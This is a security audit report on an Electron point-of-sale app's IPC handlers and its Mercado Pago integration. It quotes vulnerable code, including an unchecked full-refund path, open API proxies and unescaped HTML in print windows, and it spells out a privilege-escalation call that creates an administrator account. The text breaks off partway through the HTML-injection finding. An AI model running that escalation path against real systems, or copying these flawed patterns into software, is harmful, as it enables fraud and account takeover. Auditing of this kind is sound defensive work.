# Audit Wave 2 — Coverage Map & Proposed Plan

**Date:** 2026-04-08  
**Scope:** All files not covered by Wave 1 audit  
**Method:** Static reconnaissance across all handler, model, and infrastructure files. Formal cross-layer verification (handler → model → DB) pending in subsequent audit passes.

---

## Audit Coverage Map

| File | Wave 1 | Wave 2 Recon | Status | Risk Signal |
|------|--------|--------------|--------|-------------|
| `main.js` | ✅ | — | Formally audited | H-1, H-5, L-10 |
| `src/ipc-handlers/ventas-handlers.js` | ✅ | — | Formally audited | H-2, H-3, M-4, M-5, M-6 |
| `src/ipc-handlers/productos-handlers.js` | ✅ | — | Formally audited | H-5, H-6, H-7, H-8, M-7, M-10, M-11, M-13 |
| `src/ipc-handlers/caja-handlers.js` | ✅ | — | Formally audited | H-3c, H-4, M-8, M-9 |
| `src/database/models/Venta.js` | ✅ | — | Formally audited | H-3, L-1, L-11 |
| `src/database/models/DetalleVenta.js` | ✅ | — | Formally audited | H-2, L-12 |
| `src/database/models/Producto.js` | ✅ | — | Formally audited | M-4, M-6, M-7 |
| `src/database/models/ArqueoCaja.js` | ✅ | — | Formally audited | H-3c, M-8, L-5 |
| `renderer/preload.js` | — | ✅ Read | Recon complete | Channel allowlist gaps, onBlockMessage bypass |
| `src/ipc-handlers/session-handlers.js` | — | ✅ Formally audited | **Pass 4 complete** | See findings section below |
| `src/ipc-handlers/mercadoPago-handlers.js` | — | ✅ Formally audited | **Pass 2 complete** | See findings section below |
| `src/ipc-handlers/admin-handlers.js` | — | ✅ Formally audited | **Pass 3 complete** | See findings section below |
| `src/ipc-handlers/config-handlers.js` | — | ✅ Formally audited | **Pass 6 complete** | See findings section below |
| `src/ipc-handlers/ctascorrientes-handlers.js` | — | ✅ Read | Recon complete | No proveedor audit trail |
| `src/ipc-handlers/compras-handlers.js` | — | ✅ Formally audited | **Pass 5 complete** | See findings section below |
| `src/ipc-handlers/dashboard-handlers.js` | — | ✅ Read | Recon complete | Sueldos/gastos not period-filtered, no date range limit |
| `src/database/associations.js` | — | ✅ Read | Recon complete | No Venta→ArqueoCaja FK |
| `src/database/models/Usuario.js` | — | ✅ Read | Recon complete | Plaintext mp_access_token, no activo field |
| `src/ipc-handlers/clientes-handlers.js` | — | ✅ Read | Recon complete | Hard delete without sales FK check |
| `src/ipc-handlers/proveedores-handlers.js` | — | ✅ Read | Recon complete | Payload spread without field allowlist |
| `src/ipc-handlers/insumos-handlers.js` | — | ✅ Read | Recon complete | Payload spread, FK not verified on familia creation |
| `src/ipc-handlers/facturacion-handlers.js` | — | ✅ Read | Recon complete | Mostly stubs; residual dead model references |
| `src/ipc-handlers/registerReportesHandlers.js` | — | ✅ Read | Recon complete | `Empleado.sum` not period-filtered |
| `src/ipc-handlers/common-handlers.js` | — | ✅ Read | Recon complete | Module-level session state, `""` return on error |
| `src/ipc-handlers/scale-handlers.js` | — | ✅ Read (partial) | Recon started | Config from renderer-controlled Usuario record |
| `src/ipc-handlers/etiquetas-handlers.js` | — | ✅ Read (partial) | Recon started | Fragile model alias detection, full table load |
| `src/database/migrator.js` | — | ❌ Not read | Not analyzed | Schema evolution safety unknown |
| `src/database/models/Cliente.js` | — | ❌ Not read | Not analyzed | Deuda/descuento field constraints unknown |
| `src/database/models/Proveedor.js` | — | ❌ Not read | Not analyzed | Field constraints unknown |
| `src/database/models/Insumo.js` | — | ❌ Not read | Not analyzed | Field constraints unknown |
| `src/database/models/Compra.js` | — | ❌ Not read | Not analyzed | Financial model constraints unknown |
| `src/database/models/DetalleCompra.js` | — | ❌ Not read | Not analyzed | Line-item constraints unknown |
| `src/database/models/GastoFijo.js` | — | ❌ Not read | Not analyzed | Monto validation unknown |
| `src/database/models/Empleado.js` | — | ❌ Not read | Not analyzed | Sueldo field constraints unknown |
| `src/database/models/Factura.js` | — | ❌ Not read | Not analyzed | AFIP data schema unknown |
| `src/database/models/MovimientoCuentaCorriente.js` | — | ❌ Not read | Not analyzed | Audit trail schema unknown |
| `src/database/models/ProductoDepartamento.js` | — | ❌ Not read | Not analyzed | Classification schema |
| `src/database/models/ProductoFamilia.js` | — | ❌ Not read | Not analyzed | Classification schema |
| `src/database/models/InsumoDepartamento.js` | — | ❌ Not read | Not analyzed | Classification schema |
| `src/database/models/InsumoFamilia.js` | — | ❌ Not read | Not analyzed | Classification schema |
| `src/database/models/ProductoProveedor.js` | — | ❌ Not read | Not analyzed | Junction table schema |
| `src/database/models/InsumoProveedor.js` | — | ❌ Not read | Not analyzed | Junction table schema |

---

## Highest-Risk Unaudited Areas

Listed in descending priority, based on reconnaissance evidence.

### 1. `mercadoPago-handlers.js` — External payment gateway with plaintext credential storage

**Why it's highest risk:** The MP access token is stored as a plaintext `STRING` in the `usuarios` table and served to any renderer that calls the handler. The `create-mp-order` handler passes a renderer-supplied `items` array directly to the Mercado Pago API with no field allowlist — field injection can produce arbitrary API payloads. The `mp:refund-payment` handler accepts a `monto` from the renderer without server-side validation against the original charge amount, enabling partial-to-full refund manipulation. A token partial is exposed in debug `console.log` output that runs in production paths. This is the only handler that interfaces with an external financial API and the only place in the codebase where live payment operations occur.

### 2. `admin-handlers.js` — XSS in print output + authentication dependency

**Why it's high risk:** `imprimir-ticket` builds an HTML string using unsanitized `${recibo}` values from the renderer, served to `loadURL('data:text/html,...')`. This is a reflected XSS surface within the Electron main window. `test-print` similarly injects `${printerName}`. The handler also imports `bcrypt` (not `bcryptjs` used elsewhere), meaning the password hashing algorithm differs between user creation and login verification — accounts created by an admin may not be verifiable by the session handler. This directly affects authentication correctness.

### 3. `session-handlers.js` — No brute-force protection on authentication

**Why it's high risk:** The `login-attempt` handler performs `bcryptjs.compare` on every invocation with no rate limiting, lockout, or attempt counter. The module-level `activeUserId` variable has no multi-window isolation — in Electron, if two windows exist, one logout can corrupt the other's session state without error. No `activo` flag support means disabled accounts cannot be enforced without full deletion.

### 4. `dashboard-handlers.js` + `registerReportesHandlers.js` — Financials not period-filtered

**Why it's high risk:** `Empleado.sum("sueldo")` in `registerReportesHandlers.js` sums ALL employee salaries across all time, not the selected date range. In `dashboard-handlers.js`, `totalGastosFijos` has the same defect. Both handlers accept `dateFrom`/`dateTo` directly from the renderer (`new Date(dateFrom)`) with no range limit — a renderer supplying a 10-year window triggers full-table aggregation joins with no timeout protection. Financial reports showing incorrect profit figures can cause material business decisions based on wrong data.

### 5. `compras-handlers.js` — Renderer-supplied `UsuarioId` + price override flag

**Why it's high risk:** The purchase registration handler accepts `UsuarioId` directly from the renderer payload instead of reading it from the authenticated session. Any renderer can attribute a purchase to any user ID. Additionally, the `actualizarPrecioVenta` boolean flag comes from the renderer — if `true`, it overwrites `Producto.precioVenta` with the purchase's unit cost as provided by the renderer. This is the same class of trust violation as H-2 (sale prices from renderer), but on the purchasing side, and it can permanently alter product prices without any server-side guard.

### 6. `config-handlers.js` — Blocking I/O + unvalidated financial rate fields

**Why it's medium-high risk:** `save-business-info` uses `fs.writeFileSync` on the main process, blocking all IPC during write. The `config_recargo_credito` and `config_descuento_efectivo` fields (credit surcharge rate, cash discount rate) accept any numeric value from the renderer with no range validation — a renderer can set a 1000% credit surcharge, which then flows into sale total calculations in `ventas-handlers.js` without further validation.

### 7. `clientes-handlers.js` — Hard delete of clients with sale history

**Why it's medium risk:** `eliminar-cliente` calls `Cliente.destroy({ where: { id } })` directly. Because `PRAGMA foreign_keys` is OFF (H-1a), SQLite does not enforce the FK from `Venta.ClienteId`. Deleting a client silently orphans all their associated sales — `Venta.ClienteId` becomes a dangling pointer. Any historical reporting that joins on `ClienteId` will return `NULL` or silently exclude those rows.

### 8. `renderer/preload.js` — Channel allowlist gaps

**Why it's medium risk:** `onBlockMessage` registers `ipcRenderer.on` unconditionally without checking `validOnChannels`. The `"registrar-venta-y-facturar"` channel is listed in the allowlist but has no corresponding handler registered in main process — IPC invocations will hang indefinitely (or until timeout). `"guardar-familia"` is duplicated in `validInvokeChannels`. These are not exploitable in isolation but represent trust-boundary gaps that become relevant if the renderer is ever compromised.

---

## Proposed Audit Order

Formal Wave 2 audit should proceed in this order. Each step follows the Wave 1 methodology: static analysis → cross-layer tracing (handler → model → DB) → severity classification → findings documented in `findings.md`.

**Pass 1 — Authentication & Security Boundary**
1. `src/ipc-handlers/session-handlers.js` + `src/database/models/Usuario.js`
   - Full cross-layer trace: login flow, session state, password hashing consistency
   - Verify `bcrypt` vs `bcryptjs` divergence impact on existing password records
2. `renderer/preload.js`
   - Channel allowlist completeness audit: every `validInvokeChannels` entry verified against registered handlers
   - `onBlockMessage` removeListener gap

**Pass 2 — External Financial Integration**
3. `src/ipc-handlers/mercadoPago-handlers.js`
   - Full trace: token storage → retrieval → API call payload
   - Refund amount validation: handler → MP API
   - Debug log token exposure scope

**Pass 3 — Internal Financial Integrity (Purchasing & Reporting)**
4. `src/ipc-handlers/compras-handlers.js` + `src/database/models/Compra.js` + `src/database/models/DetalleCompra.js`
   - UsuarioId attribution chain
   - `actualizarPrecioVenta` flag impact on `Producto.precioVenta`
5. `src/ipc-handlers/dashboard-handlers.js` + `src/ipc-handlers/registerReportesHandlers.js`
   - Period-filter correctness for each aggregated metric
   - `Empleado.sum` and `GastoFijo.sum` date-range scoping
6. `src/ipc-handlers/ctascorrientes-handlers.js` + `src/database/models/MovimientoCuentaCorriente.js`
   - Audit trail completeness for client vs. proveedor payments

**Pass 4 — Admin & Configuration**
7. `src/ipc-handlers/admin-handlers.js`
   - XSS surface in `imprimir-ticket` and `test-print` — verify HTML escaping (or absence)
   - `bcrypt`/`bcryptjs` inconsistency: trace create-user → login-attempt path
   - `rol` field allowlist
8. `src/ipc-handlers/config-handlers.js`
   - Financial rate field validation (recargo, descuento)
   - Logo path traversal check
   - Blocking I/O scope

**Pass 5 — Entity Management (Clients, Suppliers, Inputs)**
9. `src/ipc-handlers/clientes-handlers.js` + `src/database/models/Cliente.js`
   - Hard-delete with orphan risk
   - `deuda` and `descuento` field constraints
10. `src/ipc-handlers/proveedores-handlers.js` + `src/database/models/Proveedor.js`
    - Payload spread allowlist gap (same pattern as M-7)
11. `src/ipc-handlers/insumos-handlers.js` + models (`Insumo`, `InsumoDepartamento`, `InsumoFamilia`)
    - Payload spread, FK verification on familia creation

**Pass 6 — Infrastructure & Schema**
12. `src/database/migrator.js`
    - Schema evolution safety: does Wave 1 H-1c (sync without alter) interact with migrator?
    - Migration conflict risk on existing installations
13. Remaining models: `GastoFijo`, `Empleado`, `Factura`, `ProductoDepartamento`, `ProductoFamilia`, `ProductoProveedor`, `InsumoProveedor`
    - Field-level constraints baseline (extending Wave 1 axiom check to all models)
14. `src/database/associations.js`
    - Full FK map: confirm which cascade behaviors are intentional

**Pass 7 — Peripheral Handlers (lower risk)**
15. `src/ipc-handlers/scale-handlers.js`
16. `src/ipc-handlers/etiquetas-handlers.js`
17. `src/ipc-handlers/facturacion-handlers.js` (dead-code verification)

---

---

## Pass 2 — Formal Audit: `src/ipc-handlers/mercadoPago-handlers.js`

**Date:** 2026-04-08  
**Cross-layer files read:** `mercadoPago-handlers.js` (439 lines), `src/database/models/Usuario.js` (86 lines)  
**Method:** Full static analysis, cross-layer verification (handler → model → DB column), external API behavior confirmed against MP API documentation patterns.

---

### MP-H1 · `get-mp-pos-list` accepts `accessToken` directly from the renderer — open MP API proxy

**Severity:** HIGH

**Evidence:**
```js
// mercadoPago-handlers.js:190–208
ipcMain.handle("get-mp-pos-list", async (_evt, { accessToken }) => {
  if (!accessToken) {
    return { success: false, message: "Se requiere Access Token." };
  }
  const url = `https://api.mercadopago.com/pos?limit=50&offset=0`;
  const fetchRes = await doFetch(url, { headers: authHeaders(accessToken, ...) });
  ...
```

This is the only handler in the file that does **not** call `resolveActiveMpContext`. It accepts `accessToken` as a renderer-supplied IPC parameter and uses it directly to authenticate a request to `https://api.mercadopago.com/pos`. The DB-stored token is never consulted.

**Cross-layer verification:**
- Handler: token from renderer, no DB read — confirmed.
- Model: `mp_access_token` stored in `Usuario` (`DataTypes.STRING`, line 41) — this column is bypassed entirely in this handler.
- DB: no constraint prevents use of an externally-supplied token — confirmed.

**Impact:** Any renderer can pass an arbitrary MP access token through this handler to query the MP POS list endpoint. The handler provides an authenticated MP API forwarding service for any token the renderer supplies. In a compromised renderer context (e.g., after XSS), this enables: (1) credential validity testing for arbitrary MP tokens, (2) POS enumeration on accounts not belonging to this installation, and (3) an indirect channel to probe the MP API under a third party's identity.

**Why it matters:** The intent is clearly to use the admin's own token (all other handlers call `resolveActiveMpContext`). The inconsistency is a logic gap, not a deliberate design. But the gap is exploitable: any token supplied by the renderer is accepted as authoritative.

---

### MP-H2 · `mp:create-preference` forwards the entire renderer `preference` object to the MP Checkout API with no field allowlist

**Severity:** HIGH

**Evidence:**
```js
// mercadoPago-handlers.js:114–130
ipcMain.handle("mp:create-preference", async (_evt, { preference }) => {
  ...
  const url = "https://api.mercadopago.com/checkout/preferences";
  return await doFetch(url, {
    method: "POST",
    headers: authHeaders(accessToken),
    body: JSON.stringify(preference || {}),
  });
});
```

`preference` is passed from the renderer unchanged. `JSON.stringify(preference)` serializes the full object as the MP API request body.

**Cross-layer verification:**
- Handler: no field filtering, no allowlist — confirmed.
- Model: no constraint limits what is stored; this handler doesn't persist locally, but does write to the MP API.
- MP Checkout Preferences API (external): accepts fields including `back_urls` (post-payment redirects), `auto_return`, `notification_url` (webhook endpoint), `marketplace_fee` (platform commission), `differential_pricing` (discount/surcharge ID), `expires`, `expiration_date_from/to`, `payer` (pre-filled buyer info), `payment_methods` (allowed/excluded methods), `sponsor_id`.

**Impact:** A renderer can construct a Checkout Preference with `notification_url` pointing to any external URL — MP will POST real payment webhook events to that URL. A renderer can set `marketplace_fee` to extract a commission from each payment into a third-party account. A renderer can set `differential_pricing` referencing a discount that reduces the actual charge. None of these fields are server-validated.

**Why it matters:** `mp:create-preference` is the entry point for checkout flows. The handler has the stored access token (legitimate) but passes renderer-controlled payload content verbatim. It is simultaneously authenticated and unguarded.

---

### MP-H3 · `mp:refund-payment` — falsy `amount` triggers full refund; no ownership validation

**Severity:** HIGH

**Evidence:**
```js
// mercadoPago-handlers.js:148–166
ipcMain.handle("mp:refund-payment", async (_evt, { paymentId, amount }) => {
  ...
  const body = amount ? { amount: Number(amount) } : {};
  return await doFetch(url, {
    method: "POST",
    headers: authHeaders(accessToken),
    body: JSON.stringify(body),
  });
});
```

The MP Payments Refund API (`POST /v1/payments/{id}/refunds`) interprets an empty body `{}` as a request for a **full refund** of the original payment amount. `amount ? ... : {}` evaluates falsy for `0`, `null`, `undefined`, `""`, and `false`.

**Cross-layer verification:**
- Handler: `amount` comes from renderer IPC parameter. No lower-bound validation (`> 0`). No upper-bound validation (`<= original_payment.transaction_amount`). Confirmed.
- Model: no `Venta` or local record is consulted. The handler does not look up whether `paymentId` exists in local `Venta` records. Confirmed.
- DB: no ownership check between `paymentId` and any local session data — confirmed.

**Impact:** A renderer invoking `mp:refund-payment` with `{ paymentId: "123", amount: 0 }` or `{ paymentId: "123", amount: null }` sends `{}` to the MP API — a full refund. The call will succeed if the payment is in a refundable state. No local audit trail is written. The refund is invisible in the POS system until the operator manually reconciles with the MP dashboard.

**Why it matters:** This is a one-call path to a real financial transaction with no server-side guard. The MP API credential is sufficient — the local application adds no additional validation layer.

---

### MP-H4 · `mp:search-payments` forwards the entire `query` object from the renderer as URLSearchParams to the MP Payments Search API

**Severity:** HIGH

**Evidence:**
```js
// mercadoPago-handlers.js:169–171
ipcMain.handle("mp:search-payments", async (_evt, { query } = {}) => {
  return await _internal_searchPayments(models, query);
});

// _internal_searchPayments, line 73
const params = new URLSearchParams(query || {});
const url = `https://api.mercadopago.com/v1/payments/search?${params.toString()}`;
```

Every key-value pair in the renderer's `query` object becomes a URL query parameter on the MP Payments Search request. There is no allowlist.

**Cross-layer verification:**
- Handler: no field filtering on `query` — confirmed.
- Internal function: `new URLSearchParams(query)` — trusts all renderer-supplied keys — confirmed.
- MP Payments Search API: accepts `collector.id`, `payer.id`, `merchant_order_id`, `sponsor_id`, `processing_mode`, `offset`, `limit`, `sort`, `criteria`, `range`, `begin_date`, `end_date`, `status`.

**Impact:** A renderer can search payments by arbitrary collector or payer IDs — including IDs not belonging to this installation's account. The handler acts as an open, authenticated proxy to the MP Payments Search endpoint. The `limit` parameter can be set to any value the MP API accepts, bypassing the 400-record cap in `get-mp-transactions`. Parameters like `collector.id` can be set to enumerate payment history for other MP accounts (provided their payments were processed on the same access token).

**Why it matters:** Unlike `get-mp-pos-list` (MP-H1), this handler uses the stored admin token — so the MP API correctly scopes responses to that account. But the full query flexibility still enables renderer-controlled date ranges, status filters, and pagination parameters that are otherwise constrained in `get-mp-transactions`.

---

### MP-M1 · `create-mp-order` — item line-totals not validated against `total_amount`

**Severity:** MEDIUM

**Evidence:**
```js
// mercadoPago-handlers.js:244–268
const numericAmount = Number(total_amount);
if (isNaN(numericAmount) || numericAmount <= 0) { return error; }

const processedItems = items.map(item => ({
  title: item.title || "Producto",
  quantity: item.quantity || 1,
  unit_price: item.unit_price || 0,
  total_amount: (item.quantity || 1) * (item.unit_price || 0),
  unit_measure: "unit"
}));

const body = {
  total_amount: numericAmount,   // from renderer, validated > 0
  items: processedItems,         // computed from renderer, not summed
  ...
};
```

`numericAmount` (the charge to the customer) is independently validated. `processedItems[].total_amount` is computed from renderer-supplied `quantity` and `unit_price`. There is no assertion that `sum(processedItems[i].total_amount) === numericAmount`.

**Cross-layer verification:**
- Handler: `total_amount` validated as numeric and > 0. Item sum not checked. Confirmed.
- Model: no local record of QR order items. This handler does not persist to DB. No cross-check possible locally.
- MP API: per MP QR order documentation, `total_amount` at the order level must equal the sum of `items[].total_amount`. If they diverge, the MP API returns a validation error — so the mismatch is caught externally, not internally.

**Impact:** The MP API will reject mismatched totals, so no financial harm to the payment itself. However, the handler produces uninformative error responses when the MP API rejects the order (the error message comes from `apiResponse.error`, which is the MP error string, not a locally-generated message). More importantly, the `unit_price: item.unit_price || 0` fallback can silently produce items with `unit_price = 0` if the renderer omits the field, generating line items that show $0 on the receipt while the `total_amount` charges the correct amount.

**Assumption requiring further verification:** Whether the renderer validates item totals before invoking this handler (renderer-side code not yet audited).

---

### MP-M2 · `create-mp-order` — full order body and token suffix logged on every invocation

**Severity:** MEDIUM

**Evidence:**
```js
// mercadoPago-handlers.js:213–216, 225, 270
console.log("==============================================");
console.log("[create-mp-order] INICIANDO CREACIÓN DE QR");
console.log(`[create-mp-order] Monto recibido: ${total_amount} (Tipo: ${typeof total_amount})`);
...
console.log(`[create-mp-order] Contexto: UserID=${userId}, PosID=${posId}, Token=...${accessToken.slice(-4)}`);
...
console.log("[create-mp-order] Enviando a MP:", JSON.stringify(body));
```

Line 270 serializes the full QR order body: `items` (product titles, quantities, unit prices), `total_amount`, `external_reference`, `notification_url`. Line 225 logs `userId`, `posId`, and the last 4 characters of the access token on every QR creation.

**Cross-layer verification:**
- Handler: confirmed — these log statements execute on every successful QR path.
- No log redaction or sanitization at any layer.

**Impact:** In a production POS with a monitoring setup that captures stdout, every sale total, product breakdown, external payment reference, and partial token suffix is written to logs. Electron console output is accessible to any process with access to the app's output stream or any error monitoring integration. The token suffix alone is low sensitivity, but combined with `userId` and `posId` in the same log line, it reduces the search space for token reconstruction. The product and price log is a confidentiality concern for business data in shared environments.

**Why it matters:** These are development-era debug statements (same pattern as L-7 in Wave 1 for products/ventas). They were never removed before production use.

---

### MP-M3 · `save-mp-config` targets all administrator accounts simultaneously; renderer can null out stored credentials

**Severity:** MEDIUM

**Evidence:**
```js
// mercadoPago-handlers.js:339–354
ipcMain.handle("save-mp-config", async (_event, data) => {
  await models.Usuario.update(
    {
      mp_access_token: data?.accessToken || null,
      mp_user_id:      data?.userId     || null,
      mp_pos_id:       data?.posId      || null,
    },
    { where: { rol: "administrador" } }
  );
  return { success: true };
});
```

The `WHERE` clause is `{ rol: "administrador" }` — a full-table filter, not a specific user ID.

**Cross-layer verification:**
- Handler: confirmed — `where: { rol: "administrador" }` affects all rows with that role.
- Model: `rol` is `DataTypes.STRING` with no `isIn` validation (separate finding in admin-handlers audit). Multiple users with `rol: "administrador"` is possible.
- DB: no unique constraint on `rol = "administrador"` — confirmed.

**Two sub-issues:**
1. If more than one admin user exists, a config save from one session overwrites the MP credentials of all admin users.
2. A renderer can send `{ accessToken: "", userId: "", posId: "" }` — these evaluate as falsy — so `|| null` stores `null` for all three fields, effectively clearing the MP integration with a single IPC call and no confirmation prompt.

**Why it matters:** MP credential loss halts QR payment collection for the entire installation until reconfigured. There is no confirmation step, no backup of the previous value, and no way to recover the token from within the application.

---

### MP-M4 · `get-mp-transactions` — `limit: "400"` (string type) with silent truncation and no pagination

**Severity:** MEDIUM

**Evidence:**
```js
// mercadoPago-handlers.js:361–377
const params = {
  sort: "date_created",
  criteria: "desc",
  limit: "400",          // string, not number
};
if (filters?.status) params.status = filters.status;
if (filters?.dateFrom) params.begin_date = filters.dateFrom;
if (filters?.dateTo)   params.end_date   = filters.dateTo;
```

`limit: "400"` is a string. `URLSearchParams` converts it to `"400"` in the query string (correct behavior), so the MP API receives `limit=400`. However:

1. The MP Payments Search API has a maximum limit of 300 per page (confirmed from MP API docs). A value of 400 may be silently capped by MP or may return an error depending on the API version.
2. No `offset` or `total` is returned to the caller — `return { success: true, data: fetchRes.data?.results || [] }` discards the `paging` object from MP's response.
3. Renderer-supplied `filters.dateFrom` and `filters.dateTo` are forwarded directly as MP API date strings without format validation. An invalid date string produces an MP API error, which returns `{ success: false, message: error }` — a fair outcome, but the validation happens at the external API rather than locally.

**Cross-layer verification:**
- Handler: no pagination, no `total` return, string limit — confirmed.

**Impact:** For date ranges with more than the limit of transactions, operators see a partial list with no indication that results were truncated. Financial reconciliation from this view is unreliable on high-volume days.

---

### MP-M5 · `doFetch` has no timeout — main process hangs on slow or unresponsive MP connections

**Severity:** MEDIUM

**Evidence:**
```js
// mercadoPago-handlers.js:26–38
async function doFetch(url, init) {
  try {
    const r = await fetch(url, init);
    ...
  } catch(e) {
    return { ok: false, error: e.message || "Error de red" };
  }
}
```

`node-fetch` v2 does not apply a default timeout. No `AbortSignal` is constructed, no `timeout` option is set, and no `Promise.race` wraps the call.

**Cross-layer verification:**
- All 12 handlers that call `doFetch` (directly or via `_internal_searchPayments` / `_internal_searchMerchantOrders`) inherit this gap.
- The Electron main process is single-threaded for IPC dispatch. A hung `doFetch` call does not block other `ipcMain.handle` registrations (they use separate microtask queues), but the renderer's `invoke` call for that specific channel will await indefinitely.

**Impact:** Network partition, MP API outage, or DNS failure during `check-mp-payment-status` (called in polling loop during QR payment) causes the renderer's status-check modal to hang with no timeout response. In a busy POS, an operator cannot dismiss a hung QR modal without restarting the application.

---

### MP-L1 · `scopes.withPassword` in `Usuario.js` also returns `mp_access_token` — naming misleads scope consumers

**Severity:** LOW

**Evidence:**
```js
// src/database/models/Usuario.js:59–61
scopes: {
  withPassword: { attributes: {} }
}
```

In Sequelize v6, a scope with `attributes: {}` (empty object) overrides the `defaultScope`'s `attributes: { exclude: ['password'] }`. The result: `Usuario.scope('withPassword').findOne(...)` returns **all** model fields including `password`, `mp_access_token`, `mp_user_id`, and `mp_pos_id`.

**Cross-layer verification (assumption — requires session-handlers.js audit to confirm):** If `session-handlers.js` uses `Usuario.scope('withPassword').findOne(...)` for login, the result object includes `mp_access_token` in addition to `password`. Whether the handler then leaks this object to the renderer is not yet verified.

**Impact confirmed:** The scope is correctly named "withPassword" but implicitly also exposes all MP credentials. Any code path that uses `scope('withPassword')` and serializes or forwards the result risks leaking the MP token.

**Assumption requiring further verification:** Whether `session-handlers.js` serializes the `scope('withPassword')` result to the renderer (flagged for Pass 1 audit).

---

### MP-L2 · `mp_access_token` stored as unbounded `DataTypes.STRING` with no format hook

**Severity:** LOW

**Evidence:**
```js
// src/database/models/Usuario.js:41
mp_access_token: { type: DataTypes.STRING },
```

No `allowNull`, no `validate`, no `beforeValidate` hook, no length limit beyond SQLite's default TEXT column. MP production access tokens follow the format `APP_USR-{digits}-{timestamp}-{hash}`. Test tokens follow `TEST-{digits}-...`. No validation enforces this format.

**Cross-layer verification:**
- Handler: `save-mp-config` accepts any string value from renderer and stores it — confirmed.
- Model: no hook, no validator — confirmed.
- DB: SQLite TEXT column, unlimited length — confirmed.

**Impact:** A misconfigured token (typo, whitespace, wrong environment) is stored and used silently. All downstream handlers will receive MP API authentication errors (`401 Unauthorized`) with no actionable local message.

---

### MP Summary

| ID | Severity | Description |
|----|----------|-------------|
| MP-H1 | HIGH | `get-mp-pos-list` accepts token from renderer — bypasses DB-stored credential entirely |
| MP-H2 | HIGH | `mp:create-preference` forwards full `preference` object to MP API — no field allowlist |
| MP-H3 | HIGH | `mp:refund-payment` — `amount: 0` or falsy triggers full refund; no ownership check |
| MP-H4 | HIGH | `mp:search-payments` forwards entire `query` object as URLSearchParams — open MP search proxy |
| MP-M1 | MEDIUM | `create-mp-order` — item sum not validated against `total_amount` |
| MP-M2 | MEDIUM | Full QR order body + token suffix logged on every invocation |
| MP-M3 | MEDIUM | `save-mp-config` targets all admins; renderer can null out credentials with empty strings |
| MP-M4 | MEDIUM | `get-mp-transactions` — limit 400 (string), silent truncation, no pagination |
| MP-M5 | MEDIUM | `doFetch` has no timeout — main process hangs on MP connection failure |
| MP-L1 | LOW | `scopes.withPassword` also returns `mp_access_token` — naming misleads scope consumers |
| MP-L2 | LOW | `mp_access_token` stored as unbounded STRING with no format validation |

**Total: 4 HIGH, 5 MEDIUM, 2 LOW**

**Next recommended audit target: `src/ipc-handlers/admin-handlers.js`**

Rationale: `admin-handlers.js` is the next highest-risk unaudited file. It contains confirmed XSS vectors in the print path (`imprimir-ticket` and `test-print` build `data:text/html` URLs from unsanitized renderer strings), a `bcrypt`/`bcryptjs` inconsistency that directly affects authentication correctness when combined with `session-handlers.js`, an unvalidated `rol` string field that determines privilege in every other handler, and user management operations including password hashing. The authentication inconsistency has cross-file impact: if `admin-handlers.js` creates users with one hash library and `session-handlers.js` verifies with another, existing user accounts may be permanently unverifiable. This is a blocking correctness issue independent of the security concerns.

---

---

## Pass 3 — Formal Audit: `src/ipc-handlers/admin-handlers.js`

**Date:** 2026-04-08  
**Cross-layer files read:** `admin-handlers.js` (412 lines), `src/ipc-handlers/session-handlers.js` (84 lines), `renderer/preload.js` (163 lines), `src/database/models/Usuario.js` (86 lines — previously read)  
**Method:** Full static analysis + cross-layer authorization trace (preload channel exposure → handler role check → session state access). HTML injection surface verified against Electron window creation defaults.

---

### ADMIN-H1 · No server-side authorization on any admin handler + `rol` accepts any string — confirmed privilege escalation path

**Severity:** HIGH

**Evidence — no role check on handlers:**

Every handler in `admin-handlers.js` reads from `models` directly with no session role verification. The module receives `models` as a parameter and registers handlers via `ipcMain.handle`. No reference to `activeUserId` (owned by `session-handlers.js`) or any role guard exists anywhere in the file.

```js
// admin-handlers.js:44 — save-user
ipcMain.handle("save-user", async (_event, userData) => {
  const { id, nombre, password, rol, permisos } = userData || {};
  // ... no check: is the caller an administrator?
  await Usuario.create({ nombre, password: hashedPassword, rol, permisos: permsArray });
  return { success: true };
});

// admin-handlers.js:95 — delete-user
ipcMain.handle("delete-user", async (_event, userId) => {
  // ... no check: is the caller an administrator?
  await userToDelete.destroy();
  return { success: true };
});
```

**Evidence — `rol` accepts any string:**

```js
// admin-handlers.js:53–55
if (!rol) {
  return { success: false, message: "El rol es obligatorio." };
}
```

`!rol` only rejects falsy values. Any non-empty string passes, including `"administrador"`.

**Evidence — channels exposed to all renderers regardless of session role:**

```js
// renderer/preload.js:13–14
"save-user",
"delete-user",
```

Both channels appear in `validInvokeChannels` — exposed unconditionally to every renderer context via `contextBridge.exposeInMainWorld`. There is no per-role channel filtering in `preload.js`.

**Cross-layer verification:**
- `session-handlers.js` sets `activeUserId` (module-level, line 4) on login. `admin-handlers.js` does not import this variable or check it.
- `preload.js` exposes `save-user`, `delete-user`, `save-empleado`, `delete-empleado`, `save-gasto-fijo`, `delete-gasto-fijo`, `test-print`, `imprimir-ticket` — all without role restrictions.
- No middleware layer exists between `ipcMain.handle` registration and execution.

**Attack path (confirmed, no speculation):**
1. User logs in with any role (e.g., cashier).
2. Renderer calls `window.electronAPI.invoke("save-user", { nombre: "x", password: "y", rol: "administrador", permisos: [] })`.
3. `save-user` handler executes, creates the new user with `rol: "administrador"`.
4. Attacker now has a second admin account.

Or:

1. Renderer calls `window.electronAPI.invoke("save-user", { id: "<own_user_id>", nombre: "...", rol: "administrador", permisos: [] })`.
2. Own user record is updated to `rol: "administrador"` — privilege self-escalation.

**Impact:** Any authenticated user — regardless of assigned role — can create administrator accounts, modify or delete any user, change any password, and modify financial data (gastos fijos, salaries). The UI sidebar filtering in `common-handlers.js` is the only access control, and it is entirely bypassable via the IPC bridge.

**Why it matters:** The entire permission system is UI-enforced only. The main process — where all state mutations occur — applies no authorization check. The IPC boundary, which is the trust boundary in Electron, enforces channel name validity (via preload allowlist) but not caller identity or role. An operator with minimal access and DevTools availability (default in Electron unless explicitly disabled) can escalate to full admin with a single IPC call.

---

### ADMIN-M1 · HTML injection in `test-print` — `${printerName}` embedded unescaped in `data:text/html` URL

**Severity:** MEDIUM

**Evidence:**

```js
// admin-handlers.js:281–293
const testWin = new BrowserWindow({ show: false });
await testWin.loadURL(
  `data:text/html,
  <html>
    <body style="font-family: monospace; font-size:12px; padding:10px;">
      <h2>🧾 PRUEBA DE IMPRESIÓN</h2>
      <p>Impresora: ${printerName || "(predeterminada)"}</p>
      <p>Fecha: ${new Date().toLocaleString()}</p>
      <hr/>
      <p>Si ves este ticket, la impresora está funcionando.</p>
    </body>
  </html>`
);
```

